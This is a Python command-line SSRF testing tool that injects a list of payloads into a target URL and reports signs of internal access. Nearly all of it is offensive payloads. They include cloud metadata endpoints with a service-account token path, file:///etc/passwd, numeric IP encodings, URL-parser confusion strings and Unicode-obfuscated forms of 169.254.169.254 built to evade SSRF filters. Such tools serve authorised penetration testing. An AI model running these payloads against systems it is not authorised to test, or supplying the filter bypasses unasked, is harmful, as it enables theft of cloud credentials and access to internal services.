import requests
import argparse
import socket

def is_private_ip(ip):
    try:
        ip_parts = list(map(int, ip.split('.')))
        return (
            ip_parts[0] == 10 or
            (ip_parts[0] == 172 and 16 <= ip_parts[1] <= 31) or
            (ip_parts[0] == 192 and ip_parts[1] == 168)
        )
    except ValueError:
        return False

def test_ssrf(url, payloads, proxy):
    headers = {
        'User-Agent': 'SSRF-Tester',
    }
    proxies = {
        'http': proxy,
        'https': proxy,
    }
    
    for payload in payloads:
        target_url = url.replace('@@', payload)
        try:
            response = requests.get(target_url, headers=headers, proxies=proxies, timeout=10)
            print(f"[*] Testing payload: {payload}")
            print(f"[+] Response status: {response.status_code}")
            
            try:
                ip = socket.gethostbyname(payload)
                if is_private_ip(ip):
                    print(f"[!] Potential SSRF to internal network: {payload} resolved to {ip}")
            except socket.gaierror:
                pass
            
            if response.status_code in [200, 301, 302] and any(keyword in response.text.lower() for keyword in ["private", "internal"]):
                print(f"[!] Possible SSRF vulnerability detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed for payload {payload}: {e}")

def main():
    parser = argparse.ArgumentParser(description='SSRF Testing Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL with @@ as placeholder')
    parser.add_argument('-p', '--proxy', default='http://localhost:8080', help='Proxy server to use (default: http://localhost:8080)')
    args = parser.parse_args()

    payloads = [
        'http://localhost',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://169.254.169.254/latest/meta-data',  # AWS instance metadata
        'http://metadata.google.internal/computeMetadata/v1/',  # GCP instance metadata
        'http://internal.example.com',  # Example for internal DNS names
        'http://[::1]',  # IPv6 localhost
        'http://2130706433',  # Decimal representation of 127.0.0.1
        'http://3232235521',  # Decimal representation of 192.168.0.1
        'http://0x7f000001',  # Hexadecimal representation of 127.0.0.1
        'http://017700000001',  # Octal representation of 127.0.0.1
        'http://localtest.me',  # Domain that resolves to 127.0.0.1
        'http://*.s3.amazonaws.com',  # AWS S3 wildcard
        'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',  # GCP metadata service
        'http://docker.for.mac.localhost',  # Docker for Mac localhost
        'http://host.docker.internal',  # Docker internal hostname
        'file:///etc/passwd',  # File protocol example
        'http://ftp.example.com:21',  # FTP service example
        'dict://example.com',  # Dictionary protocol example
        'http://google.com:80+&@127.88.23.245:22/#+@google.com:80/',
        'http://127.88.23.245:22/+&@google.com:80#+@google.com:80/',
        'http://google.com:80+&@google.com:80#+@127.88.23.245:22/',
        'http://127.88.23.245:22/?@google.com:80/',
        'http://127.88.23.245:22/#@www.google.com:80/',
        'http://google.com:80\@127.88.23.245:22/',
        'http://169。254。169。254/',
        'http://169｡254｡169｡254/',
        'http://⑯⑨。②⑤④。⑯⑨｡②⑤④/',
        'http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/',
        'http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/',
        'http://②⑧⑤②⓪③⑨①⑥⑥:80/',
        'http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/',
        'http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/',
        'http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/',
        'http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/',
        'http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/',
        'http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/',
        'http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/',
        'http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/',
        'http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/',
    ]

    test_ssrf(args.url, payloads, args.proxy)

if __name__ == "__main__":
    main()
